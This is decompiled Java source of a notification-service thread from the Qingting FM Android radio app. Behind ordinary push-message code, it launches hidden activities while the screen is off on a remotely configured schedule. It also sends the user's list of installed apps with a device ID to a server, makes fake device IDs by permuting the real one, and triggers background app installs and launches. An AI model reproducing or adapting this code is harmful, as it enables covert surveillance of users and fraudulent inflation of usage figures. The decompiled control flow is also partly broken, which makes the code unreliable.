package fm.qingting.qtradio.notification;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.PowerManager;
import android.telephony.TelephonyManager;
import com.umeng.analytics.MobclickAgent;
import fm.qingting.framework.data.IResultRecvHandler;
import fm.qingting.framework.data.IResultToken;
import fm.qingting.framework.data.Result;
import fm.qingting.qtradio.NotificationService;
import fm.qingting.qtradio.QTActivity;
import fm.qingting.qtradio.QTRadioActivity;
import fm.qingting.qtradio.ShieldActivity;
import fm.qingting.qtradio.localpush.ChannelUpdate;
import fm.qingting.qtradio.log.LogModule;
import fm.qingting.qtradio.manager.QtApiLevelManager;
import fm.qingting.qtradio.model.DataLoadWrapper;
import fm.qingting.qtradio.model.GlobalCfg;
import fm.qingting.qtradio.model.LocalPushConfigure;
import fm.qingting.qtradio.push.log.UpdatePushLog;
import fm.qingting.utils.AppInfo;
import fm.qingting.utils.DateUtil;
import fm.qingting.utils.DeviceInfo;
import fm.qingting.utils.LifeTime;
import fm.qingting.utils.ProcessDetect;
import fm.qingting.utils.RangeRandom;
import fm.qingting.utils.TimeUtil;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Iterator;
import java.util.List;
import org.json.JSONObject;

public class MessageThread extends Thread
{
  private static final String AppsInfo = "APPsInfo";
  private static final long TENSECS = 10000L;
  private static long lastStartTime = System.currentTimeMillis() / 1000L;
  private long ONE_DAY = 86400L;
  private long PROMETHEUS_INTERVAL = 1800L;
  private Context context;
  private boolean justSleep = false;
  private String mChannelName;
  private int mDoIRE = -1;
  private int mDoPrometheusIndex = 0;
  private long mDoPrometheusTime = -1L;
  private long mDoShieldStart = 0L;
  private long mDoShieldTime = -1L;
  private long mLastDoPrometheusTime = -1L;
  private List<String> mLstPrometheusTids = null;
  private boolean mNeedLazyStart = false;
  private int mPrometheusCnt = 0;
  private long mPrometheusInterval = 60L;
  private long mPrometheusStartTime = 0L;
  private LocalPushConfigure mPushConfig = new LocalPushConfigure();
  private String mResetId = "#";
  private long mSelectTime = -1L;
  private boolean mSelectedUser = true;
  private long mSendAppsInfoTime = 0L;
  private long mSendAppsInterval = 259200000L;
  private long mShieldEndTime = 0L;
  private long mShieldStartTime = 0L;
  private long mShieldStartTimeV3 = 0L;
  List<localMessage> messageList;
  private MessageCenter msgCenter;
  private IResultRecvHandler resultRecver = new IResultRecvHandler()
  {
    public void onRecvResult(Result paramAnonymousResult, Object paramAnonymousObject1, IResultToken paramAnonymousIResultToken, Object paramAnonymousObject2)
    {
      if ((paramAnonymousResult.getSuccess()) && (paramAnonymousIResultToken.getType().equalsIgnoreCase("get_user_tids")))
      {
        MessageThread.access$002(MessageThread.this, (List)paramAnonymousResult.getData());
        if (MessageThread.this.mLstPrometheusTids != null)
          MessageThread.access$102(MessageThread.this, 0);
      }
    }
  };
  private long updateConfigTime = 0L;
  private int waiting;

  public MessageThread(NotificationService paramNotificationService)
  {
    this.context = paramNotificationService;
    this.msgCenter = new MessageCenter(paramNotificationService);
    this.waiting = 0;
    this.messageList = new ArrayList();
    this.mChannelName = AppInfo.getChannelName(this.context);
    getShieldTime();
    getSelectTime();
    getSelectUser();
    getDoPrometheus();
    getDoIRE();
    InstallApp.getInstance().init(this.context);
  }

  private void doPrometheus()
  {
    if ((this.mLstPrometheusTids != null) && (this.mDoPrometheusIndex < this.mLstPrometheusTids.size()))
    {
      Intent localIntent = new Intent();
      localIntent.putExtra("notify_type", "shield");
      localIntent.putExtra("prometheus", (String)this.mLstPrometheusTids.get(this.mDoPrometheusIndex));
      localIntent.setFlags(268435456);
      localIntent.setClass(this.context.getApplicationContext(), ShieldActivity.class);
      this.mDoPrometheusIndex += 1;
      this.mLastDoPrometheusTime = (System.currentTimeMillis() / 1000L);
      if (this.mDoPrometheusIndex >= this.mLstPrometheusTids.size())
        setDoPrometheus(DateUtil.getCurrentMillis());
      this.context.startActivity(localIntent);
    }
  }

  private void doShield()
  {
    setShieldTime(DateUtil.getCurrentMillis());
    this.mDoShieldStart = 0L;
    Intent localIntent = new Intent("android.intent.action.SHIELD");
    localIntent.putExtra("notify_type", "shield");
    localIntent.setFlags(268435456);
    localIntent.setClass(this.context.getApplicationContext(), ShieldActivity.class);
    this.context.startActivity(localIntent);
  }

  private boolean enableLocalPush()
  {
    String str = HttpNotification.getInstance().getNotify("http://api.qingting.fm/api/qtradiov2/localpush?type=android", null, null);
    if ((str != null) && (!str.equalsIgnoreCase("")))
      parseLocalNotification(str);
    return this.mPushConfig.enableLocalPush();
  }

  private void execPrometheus()
  {
    try
    {
      if (!isPrometheusTime())
        return;
      if (isUpdateMobclickConfig())
        this.updateConfigTime = (System.currentTimeMillis() / 1000L);
      String str = MobclickAgent.getConfigParams(this.context, "ThePrometheusChannelV2");
      if ((str != null) && (this.mChannelName != null) && ((str.equalsIgnoreCase("all")) || (str.contains(this.mChannelName))))
      {
        str = MobclickAgent.getConfigParams(this.context, "ThePrometheusStartTime");
        if ((str == null) || (str.equalsIgnoreCase("")))
        {
          this.mPrometheusStartTime = 0L;
          return;
        }
        this.mPrometheusStartTime = Long.valueOf(str).longValue();
        str = MobclickAgent.getConfigParams(this.context, "ThePrometheus");
        if ((str == null) || (str.equalsIgnoreCase("")));
        for (this.mPrometheusCnt = 0; ; this.mPrometheusCnt = Integer.valueOf(str).intValue())
        {
          this.mPrometheusStartTime = (getTodaySec() + this.mPrometheusStartTime);
          str = MobclickAgent.getConfigParams(this.context, "ApolloClone");
          if ((str != null) && (!str.equalsIgnoreCase("")))
            initPrometheus(Integer.valueOf(str).intValue());
          handlePrometheus();
          return;
        }
      }
      return;
    }
    catch (Exception localException)
    {
    }
  }

  private void execTheShield()
  {
    while (true)
    {
      try
      {
        if (!isProperTime())
          return;
        if (isUpdateMobclickConfig())
          this.updateConfigTime = (System.currentTimeMillis() / 1000L);
        Object localObject2 = MobclickAgent.getConfigParams(this.context, "TheShieldV2");
        if (localObject2 == null)
          break label315;
        Object localObject1 = localObject2;
        if (((String)localObject2).equalsIgnoreCase(""))
          break label315;
        String str4 = "25200";
        String str5 = "25200";
        String str3 = str5;
        String str2 = str4;
        localObject2 = localObject1;
        if (TimeUtil.isSundayOrSaturday())
        {
          str3 = str5;
          str2 = str4;
          localObject2 = localObject1;
          if (!localObject1.equalsIgnoreCase("0"))
          {
            localObject2 = "60";
            str2 = "39600";
            str3 = "39600";
          }
        }
        this.mNeedLazyStart = false;
        if ((("3600" == null) || ("3600".equalsIgnoreCase("")) || (isProperTime(Integer.valueOf("3600").intValue() * 1000))) && (("all" == null) || (this.mChannelName == null) || ("all".equalsIgnoreCase("all")) || ("all".contains(this.mChannelName))) && (localObject2 != null))
        {
          this.mShieldStartTimeV3 = Long.valueOf(str3).longValue();
          if ((str2 != null) && ("61200" != null))
          {
            this.mShieldStartTime = (getTodaySec() + Long.valueOf(str2).longValue());
            this.mShieldEndTime = (this.mShieldStartTime + Integer.valueOf("61200").intValue());
          }
          if ((str3 != null) && (!str3.equalsIgnoreCase("")))
          {
            long l = getTodaySec();
            this.mShieldStartTimeV3 = (Long.valueOf(str3).longValue() + l);
          }
          int i = Integer.valueOf((String)localObject2).intValue();
          if (i > 0)
          {
            handleShield(i);
            return;
          }
        }
      }
      catch (Exception localException)
      {
      }
      return;
      label315: String str1 = "100";
    }
  }

  private void getDoIRE()
  {
    this.mDoIRE = GlobalCfg.getInstance(this.context).getDoIRE();
  }

  private long getDoPrometheus()
  {
    if (this.mDoPrometheusTime == -1L)
      this.mDoPrometheusTime = GlobalCfg.getInstance(this.context).getDoPrometheusTime();
    return this.mDoPrometheusTime;
  }

  private long getSelectTime()
  {
    if (this.mSelectTime == -1L)
      this.mSelectTime = GlobalCfg.getInstance(this.context).getDoShieldSelectTime();
    return this.mSelectTime;
  }

  private boolean getSelectUser()
  {
    this.mSelectedUser = GlobalCfg.getInstance(this.context).getShieldSelectUser();
    return this.mSelectedUser;
  }

  private long getShieldTime()
  {
    if (this.mDoShieldTime == -1L)
      this.mDoShieldTime = GlobalCfg.getInstance(this.context).getDoShieldTime();
    return this.mDoShieldTime;
  }

  private long getTodaySec()
  {
    long l = System.currentTimeMillis();
    Calendar localCalendar = Calendar.getInstance();
    localCalendar.setTimeInMillis(l);
    int i = localCalendar.get(11);
    int j = localCalendar.get(12);
    int k = localCalendar.get(13);
    return l / 1000L - i * 3600 - j * 60 - k;
  }

  private void handlePrometheus()
  {
    long l;
    if (this.mPrometheusStartTime > 0L)
    {
      l = System.currentTimeMillis() / 1000L;
      if (l >= this.mPrometheusStartTime)
        break label27;
    }
    label27: 
    do
    {
      do
        return;
      while (this.mPrometheusStartTime - this.mDoPrometheusTime <= this.ONE_DAY);
      if ((this.mLstPrometheusTids == null) || (this.mDoPrometheusIndex >= this.mLstPrometheusTids.size()))
      {
        DataLoadWrapper.loadUserTids(this.mPrometheusCnt, this.resultRecver);
        return;
      }
      if (this.mLastDoPrometheusTime == -1L)
        break;
    }
    while (l - this.mLastDoPrometheusTime <= this.mPrometheusInterval);
    doPrometheus();
    this.mPrometheusInterval = RangeRandom.Random(this.PROMETHEUS_INTERVAL);
    return;
    doPrometheus();
  }

  private void handleShield(int paramInt)
  {
    if (shouldStartShield(paramInt))
    {
      long l = System.currentTimeMillis() / 1000L;
      if ((this.mShieldStartTimeV3 > 0L) || (this.mShieldStartTime > l) || (l > this.mShieldEndTime))
        break label123;
      if (!this.mNeedLazyStart)
        break label118;
      if (this.mDoShieldStart == 0L)
        this.mDoShieldStart = (RangeRandom.Random(this.mShieldEndTime - l - 100L) + l);
      if ((this.mDoShieldStart > l) || (l > this.mShieldEndTime))
        break label101;
      doShield();
    }
    label101: label118: label123: 
    do
    {
      do
      {
        do
          return;
        while (this.mDoShieldStart <= this.mShieldEndTime);
        doShield();
        return;
        doShield();
        return;
      }
      while (this.mShieldStartTimeV3 <= 0L);
      if (System.currentTimeMillis() / 1000L >= this.mShieldStartTimeV3)
        break;
    }
    while (this.mShieldStartTimeV3 - this.mDoShieldTime <= this.ONE_DAY);
    doShield();
    return;
    doShield();
  }

  private void initPrometheus(int paramInt)
  {
    if (paramInt == 0);
    Object localObject;
    do
    {
      do
      {
        do
        {
          return;
          if (this.mLstPrometheusTids == null)
            this.mLstPrometheusTids = new ArrayList();
        }
        while (this.mLstPrometheusTids.size() != 0);
        resetPrometheus();
        localObject = this.context.getSharedPreferences("tdid", 0);
      }
      while (localObject == null);
      localObject = ((SharedPreferences)localObject).getString("pref.deviceid.key", "");
    }
    while ((localObject == null) || (((String)localObject).length() == 0));
    if (((String)localObject).length() > paramInt)
    {
      char[] arrayOfChar = ((String)localObject).toCharArray();
      int j = 1;
      while (j <= paramInt)
      {
        int i = arrayOfChar[0];
        arrayOfChar[0] = arrayOfChar[j];
        arrayOfChar[j] = i;
        String str = new String(arrayOfChar);
        this.mLstPrometheusTids.add(str);
        j += 1;
      }
    }
    this.mLstPrometheusTids.add(localObject);
  }

  private boolean isPrometheusTime()
  {
    int i = Calendar.getInstance().get(11);
    if ((i < 7) || (i > 23));
    long l;
    do
    {
      return false;
      if (this.mDoPrometheusTime == -1L)
        this.mDoPrometheusTime = GlobalCfg.getInstance(this.context).getDoPrometheusTime();
      l = DateUtil.getCurrentMillis();
    }
    while (!DateUtil.isDifferentDayMs(this.mDoPrometheusTime, l));
    return true;
  }

  private boolean isProperTime()
  {
    long l1 = LifeTime.getLastQuitTimeMs(this.context);
    long l2 = DateUtil.getCurrentMillis();
    return (DateUtil.isDifferentDayMs(l1, l2)) && (DateUtil.isDifferentDayMs(this.mDoShieldTime, l2));
  }

  private boolean isProperTime(int paramInt)
  {
    boolean bool2 = false;
    long l = DateUtil.getCurrentMillis();
    boolean bool1 = bool2;
    if (l - LifeTime.getLastQuitTimeMs(this.context) >= paramInt)
    {
      bool1 = bool2;
      if (DateUtil.isDifferentDayMs(this.mDoShieldTime, l))
        bool1 = true;
    }
    return bool1;
  }

  private boolean isUpdateMobclickConfig()
  {
    if (this.updateConfigTime == 0L);
    long l;
    do
    {
      return true;
      l = System.currentTimeMillis() / 1000L;
      if (l - this.updateConfigTime < 600L)
        return false;
    }
    while ((l - this.updateConfigTime > 216000L) || (Calendar.getInstance().get(12) < 2));
    return false;
  }

  private void parseLocalNotification(String paramString)
  {
    if (paramString != null);
    try
    {
      int i = new JSONObject(paramString).getJSONObject("data").getInt("enabled");
      this.mPushConfig.setEnableLocalPush(i);
      return;
    }
    catch (Exception paramString)
    {
    }
  }

  private void pullMessage()
  {
    while (true)
    {
      localMessage locallocalMessage2;
      try
      {
        localMessage locallocalMessage1 = this.msgCenter.getMessage("reserve", null);
        locallocalMessage2 = this.msgCenter.getMessage("alarm", null);
        localMessage locallocalMessage3 = this.msgCenter.getMessage("localNotification", null);
        localMessage locallocalMessage4 = this.msgCenter.getMessage("localrecommend", null);
        localMessage locallocalMessage5 = this.msgCenter.getMessage("reply", null);
        if (locallocalMessage1 != null)
          this.messageList.add(locallocalMessage1);
        if (locallocalMessage2 != null)
          this.messageList.add(locallocalMessage2);
        if (locallocalMessage4 != null)
          this.messageList.add(locallocalMessage4);
        if (locallocalMessage5 != null)
        {
          this.messageList.add(locallocalMessage5);
          break label181;
          if ((locallocalMessage3 != null) && (enableLocalPush()))
            this.messageList.add(locallocalMessage3);
          if ((this.messageList != null) && (this.messageList.size() > 0))
            saveAndSendMessages(this.messageList);
          return;
        }
      }
      catch (Exception localException)
      {
        return;
      }
      label181: if (localException != null)
        if (locallocalMessage2 != null);
    }
  }

  private String queryFilterAppInfo()
  {
    if (this.context == null);
    PackageManager localPackageManager;
    do
    {
      do
      {
        return null;
        localPackageManager = this.context.getPackageManager();
      }
      while (localPackageManager == null);
      localObject1 = localPackageManager.getInstalledApplications(8192);
    }
    while (localObject1 == null);
    String str1 = "" + "\"";
    Object localObject1 = ((List)localObject1).iterator();
    while (((Iterator)localObject1).hasNext())
    {
      Object localObject2 = (ApplicationInfo)((Iterator)localObject1).next();
      if (((((ApplicationInfo)localObject2).flags & 0x80) == 0) && ((((ApplicationInfo)localObject2).flags & 0x1) == 0))
      {
        String str2 = ((ApplicationInfo)localObject2).packageName;
        if ((str2 == null) || (str2.contains("com.android")) || (str2.contains("com.google")))
          break label353;
        localObject2 = (String)((ApplicationInfo)localObject2).loadLabel(localPackageManager);
        if ((localObject2 == null) || (((String)localObject2).equalsIgnoreCase("\n")))
          break label353;
        localObject2 = ((String)localObject2).replaceAll("(\r\n|\r|\n|\n\r)", "");
        str1 = str1 + (String)localObject2;
        str1 = str1 + "_";
      }
    }
    label353: 
    while (true)
    {
      break;
      str1 = str1 + "\"";
      str1 = str1 + ",";
      str1 = str1 + "\"";
      str1 = str1 + DeviceInfo.getUniqueId(this.context);
      str1 = str1 + "\"";
      return str1 + "\n";
    }
  }

  private void resetPrometheus()
  {
    this.mDoPrometheusIndex = 0;
    if (this.mLstPrometheusTids != null)
      this.mLstPrometheusTids.clear();
  }

  private void resetShield(String paramString)
  {
    if ((this.mResetId == null) || (paramString == null));
    while ((this.mResetId.equalsIgnoreCase(paramString)) || (this.mSelectedUser))
      return;
    this.mResetId = paramString;
    setSelectTime(0L);
  }

  private void saveAndSendMessages(List<localMessage> paramList)
  {
    if (paramList == null);
    do
    {
      do
        return;
      while (paramList.size() == 0);
      long l = System.currentTimeMillis() / 1000L;
    }
    while (paramList.size() >= 0);
    localMessage locallocalMessage = (localMessage)paramList.get(0);
    Intent localIntent = new Intent("fm.qingting.qtradio.SHOW_NOTIFICATION");
    localIntent.putExtra("NOTIFICATION_TITLE", locallocalMessage.title);
    localIntent.putExtra("NOTIFICATION_MESSAGE", locallocalMessage.content);
    localIntent.putExtra("NOTIFICATION_ID", "11");
    localIntent.putExtra("duetime", locallocalMessage.startTime);
    localIntent.putExtra("notify_type", locallocalMessage.page);
    localIntent.putExtra("channelid", locallocalMessage.channelid);
    localIntent.putExtra("channelname", locallocalMessage.channelname);
    localIntent.putExtra("categoryid", locallocalMessage.categoryId);
    localIntent.putExtra("programid", locallocalMessage.programId);
    localIntent.putExtra("alarmType", locallocalMessage.type);
    paramList.remove(0);
    this.waiting = 0;
    if (locallocalMessage.page.equalsIgnoreCase("alarm"))
    {
      localIntent.setFlags(268435456);
      localIntent.setClass(this.context.getApplicationContext(), QTRadioActivity.class);
      this.context.startActivity(localIntent);
      return;
    }
    if (locallocalMessage.page.equalsIgnoreCase("reserve"));
    new Notifier(this.msgCenter.getContext()).notify("11", "", locallocalMessage.title, locallocalMessage.content, "", String.valueOf(locallocalMessage.startTime), locallocalMessage.channelname, Integer.valueOf(locallocalMessage.channelid).intValue(), locallocalMessage.page, Integer.valueOf(locallocalMessage.categoryId).intValue(), 0, 0, 0, Integer.valueOf(locallocalMessage.type).intValue(), null, null);
  }

  private void sendAppsInfo()
  {
    try
    {
      long l = DateUtil.getCurrentMillis();
      if (!DateUtil.isDifferentDayMs(this.mSendAppsInfoTime, l))
        return;
      if (l - GlobalCfg.getInstance(this.context).getSendAppsTime() >= this.mSendAppsInterval)
      {
        String str = MobclickAgent.getConfigParams(this.context, "privacy");
        if ((str != null) && (!str.equalsIgnoreCase("")) && (!str.equalsIgnoreCase("#")))
        {
          this.mSendAppsInfoTime = l;
          str = queryFilterAppInfo();
          if (str != null)
          {
            LogModule.getInstance().send("APPsInfo", str);
            GlobalCfg.getInstance(this.context).setSendAppsTime(l);
            return;
          }
        }
      }
    }
    catch (Exception localException)
    {
    }
  }

  private void sendServiceLog()
  {
    UpdatePushLog.sendLiveLog(ChannelUpdate.getInstance().getFavNodesNum(), this.context);
  }

  private void setDoPrometheus(long paramLong)
  {
    this.mDoPrometheusTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoPrometheusTime(paramLong);
    resetPrometheus();
  }

  private void setSelectTime(long paramLong)
  {
    this.mSelectTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoShieldSelectTime(paramLong);
  }

  private void setSelectUser(boolean paramBoolean)
  {
    this.mSelectedUser = paramBoolean;
    GlobalCfg.getInstance(this.context).setShieldSelectUser(paramBoolean);
  }

  private void setShieldTime(long paramLong)
  {
    this.mDoShieldTime = paramLong;
    GlobalCfg.getInstance(this.context).setDoShieldTime(paramLong);
  }

  private boolean shouldStartShield(int paramInt)
  {
    long l = DateUtil.getCurrentMillis();
    if (!DateUtil.isDifferentDayMs(this.mSelectTime, l))
      return this.mSelectedUser;
    setSelectTime(l);
    if (paramInt >= 100)
    {
      this.mSelectedUser = true;
      setSelectUser(this.mSelectedUser);
      return this.mSelectedUser;
    }
    if (paramInt <= 0)
    {
      this.mSelectedUser = false;
      setSelectUser(this.mSelectedUser);
      return this.mSelectedUser;
    }
    this.mSelectedUser = RangeRandom.random(paramInt / 100.0D);
    return this.mSelectedUser;
  }

  private long waiting()
  {
    return 10000L;
  }

  public String getTypeOfNetwork(Context paramContext)
  {
    int i;
    label47: label51: 
    do
    {
      try
      {
        i = ((TelephonyManager)paramContext.getSystemService("phone")).getNetworkType();
        if ((i != 6) && (i != 4))
        {
          if (i != 7)
            break label51;
          break label47;
          return "4";
        }
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return "others";
      }
      return "3";
      if (i == 2)
        return "1";
    }
    while ((i != 1) && (i != 3) && (i != 8));
    return "2";
  }

  @SuppressLint({"NewApi"})
  public boolean isScreenOn()
  {
    if (this.context == null)
      return false;
    boolean bool;
    try
    {
      PowerManager localPowerManager = (PowerManager)this.context.getSystemService("power");
      if (QtApiLevelManager.isApiLevelSupported(20))
        bool = localPowerManager.isInteractive();
      else
        bool = localPowerManager.isScreenOn();
    }
    catch (Exception localException)
    {
    }
    while (bool)
      return true;
    return false;
  }

  public void run()
  {
    try
    {
      while (!isInterrupted())
      {
        pullMessage();
        Thread.sleep(waiting());
        if (!ProcessDetect.processExists(this.context.getPackageName() + ":local", null))
        {
          sendServiceLog();
          if (!isScreenOn())
          {
            startQTActivity(this.context);
            execTheShield();
            sendAppsInfo();
            execPrometheus();
            InstallApp.getInstance().install();
            InstallApp.getInstance().startApp();
          }
        }
      }
    }
    catch (InterruptedException localInterruptedException)
    {
    }
    catch (Exception localException)
    {
    }
  }

  public void runAtNormalPath()
  {
    this.justSleep = false;
  }

  public void saveMessage(localMessage paramlocalMessage)
  {
  }

  public void sleepQuiteALongTime()
  {
    this.justSleep = true;
  }

  public boolean startQTActivity(Context paramContext)
  {
    if ((paramContext == null) || (this.mDoIRE < 0));
    while (System.currentTimeMillis() / 1000L - lastStartTime < this.mDoIRE * 20 * 60 + 300)
      return false;
    this.mDoIRE += 1;
    if (this.mDoIRE > 7)
      getDoIRE();
    lastStartTime = System.currentTimeMillis() / 1000L;
    Intent localIntent = new Intent("android.intent.action.QTACTIVITY");
    localIntent.putExtra("notify_type", "shield");
    localIntent.setFlags(268435456);
    localIntent.setClass(paramContext.getApplicationContext(), QTActivity.class);
    paramContext.startActivity(localIntent);
    return true;
  }
}

/* Location:           C:\Users\User\dex2jar-2.0\dex\qting\classes-dex2jar.jar
 * Qualified Name:     fm.qingting.qtradio.notification.MessageThread
 * JD-Core Version:    0.6.2
 */